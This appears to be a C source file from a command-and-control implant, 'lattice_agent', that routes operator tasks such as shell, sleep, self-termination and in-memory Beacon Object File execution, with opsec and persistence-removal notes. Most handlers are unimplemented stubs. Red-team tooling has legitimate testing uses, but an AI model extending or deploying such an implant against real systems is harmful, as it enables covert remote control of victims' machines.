// dispatcher.c — routes tasks to the appropriate handler.
//
// Built-in handlers (SHELL, SLEEP, DIE, UPLOAD, DOWNLOAD) live here.
// BOF tasks are forwarded to bof_exec() which resolves the COFF loader
// linked in from src/core/coff_loader.c.

#include "lattice_agent.h"

static int handle_shell(const lattice_task_t *task, lattice_result_t *result) {
    // TODO: CreateProcessW with redirected stdout, collect output.
    // fork-and-run vs in-process controlled by operational_plane.fork_and_run.
    result->success = 0;
    result->error   = "SHELL not yet implemented";
    return 0;
}

static int handle_sleep(const lattice_task_t *task, lattice_result_t *result) {
    // Payload: 4 bytes sleep_ms (LE) + 1 byte jitter_pct.
    // TODO: parse, update LATTICE_SLEEP_MS / LATTICE_JITTER_PCT globals.
    result->success = 1;
    return 0;
}

static int handle_die(const lattice_task_t *task, lattice_result_t *result) {
    // TODO: clean exit — zero agent memory, remove persistence if any.
    result->success = 1;
    // The loop will continue but transport_recv should return -1 after die.
    return 0;
}

static int handle_bof(const lattice_task_t *task, lattice_result_t *result) {
    return bof_exec(task->payload, task->payload_len, task->bof_mode,
                    NULL, 0);
}

static int handle_profile_hot(const lattice_task_t *task, lattice_result_t *result) {
    // OTA opsec_plane hot-swap: re-parse and apply the opsec_plane JSON
    // embedded in task->payload without touching wire_plane or operational_plane.
    // TODO: parse opsec_plane fields from payload, update globals.
    result->success = 0;
    result->error   = "profile hot-swap not yet implemented";
    return 0;
}

int lattice_dispatch(const lattice_task_t *task, lattice_result_t *result) {
    switch (task->type) {
        case TASK_SHELL:       return handle_shell(task, result);
        case TASK_SLEEP:       return handle_sleep(task, result);
        case TASK_DIE:         return handle_die(task, result);
        case TASK_BOF:         return handle_bof(task, result);
        case TASK_PROFILE_HOT: return handle_profile_hot(task, result);
        default:
            result->success = 0;
            result->error   = "unknown task type";
            return -1;
    }
}
